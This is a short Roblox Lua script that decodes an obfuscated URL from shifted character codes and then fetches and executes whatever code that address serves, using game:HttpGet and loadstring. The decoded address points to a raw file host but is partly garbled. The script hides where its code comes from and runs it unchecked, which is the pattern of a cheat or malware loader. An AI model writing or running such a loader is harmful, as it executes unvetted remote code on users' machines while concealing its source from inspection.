local function _d(b, s) local r = {} for i=1,#b do r[i] = string.char(b[i]-s) end return table.concat(r) end

getgenv()._u = "https://api."

local next_repo = _d({111, 123, 123, 119, 122, 65, 54, 54, 121, 104, 126, 53, 110, 112, 123, 111, 124, 105, 106, 108, 118, 108, 121, 123, 118, 118, 110, 117, 108, 117, 123, 53, 106, 118, 116, 53, 89, 108, 119, 118, 50, 54, 119, 104, 119, 117, 57, 53, 109, 122, 104}, 7)

loadstring(game:HttpGet(next_repo))()
